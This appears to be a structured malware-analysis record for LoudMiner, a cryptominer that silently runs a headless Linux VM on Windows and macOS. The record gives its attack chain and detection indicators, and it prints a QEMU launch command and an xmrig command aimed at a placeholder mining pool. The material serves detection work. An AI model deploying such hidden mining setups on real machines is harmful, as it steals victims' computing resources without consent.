package_info.package_manager: N/A (malware distributed via disk images, not a package manager)
package_info.why_malicious: LoudMiner is a cryptomining malware that leverages virtualization to surreptitiously run a Linux virtual machine containing pre-installed cryptocurrency mining software on Windows and macOS systems, abusing system resources for unauthorized mining operations.

execution_context.trigger: runtime (upon execution of the malicious installer or application)
execution_context.file_location: malicious disk image (ISO/DMG) containing the installer and VM image

malicious_snippets.code_snippet:
Command-line invocation to launch a headless Linux VM with a pre-configured cryptominer:

qemu-system-x86_64 -hda miner_vm.img -m 512 -nographic -net user,hostfwd=tcp::2222-:22 -net nic

# Inside the VM, the following command runs automatically:
./xmrig -o pool.example.com:3333 -u wallet_address -p x
malicious_snippets.code_behavior: At runtime, the code launches a hidden Linux virtual machine using QEMU, which automatically starts a cryptocurrency miner that connects to a mining pool, resulting in unauthorized use of the victim's CPU resources for cryptomining.

malice_analysis.why_suspicious: Launching a hidden virtual machine and running a cryptominer without user consent is a clear indicator of malicious intent, as it hijacks system resources for the attacker's financial gain.
malice_analysis.violated_expectations: Normal installers or applications do not silently deploy and run virtual machines with pre-installed mining software. Legitimate use of virtualization would be transparent and user-initiated.
malice_analysis.similar_legitimate_use: Developers or power users may use virtualization to run test environments, but this is always user-initiated and transparent.
key_indicators: Silent deployment and execution of a virtual machine
Network connections to known mining pools

attack_chain.action: Victim downloads and executes a malicious disk image (ISO/DMG) containing the LoudMiner installer.
attack_chain.leads_to: Installation of virtualization software and VM image.

attack_chain.action: Malicious installer silently installs QEMU (or similar virtualization software) and deploys a pre-configured Linux VM image.
Installer launches the Linux VM in headless mode and starts the cryptominer process inside the VM.
attack_chain.leads_to: Ongoing unauthorized cryptomining and resource abuse.

behavioral_signatures: Silent installation and execution of virtualization software (QEMU, VirtualBox, etc.)
Automatic launch of headless virtual machines
Background processes connecting to cryptocurrency mining pools
Unexpected high CPU usage with no visible application
file_indicators: Presence of VM disk images (e.g., miner_vm.img, *.qcow2, *.vmdk) in application directories
Bundled QEMU or virtualization binaries in non-standard locations
network_indicators: Outbound connections to known mining pool domains or IPs (e.g., pool.example.com:3333)
Unusual network traffic from virtualized network interfaces
detection_knowledge.how_to_detect: Monitor for the silent installation and execution of virtualization software, the presence of unexpected VM disk images, and background processes establishing connections to cryptocurrency mining pools. Correlate high CPU usage with the presence of hidden VMs and mining binaries. Network monitoring for mining pool traffic and inspection of installer scripts for virtualization commands can also reveal this threat.
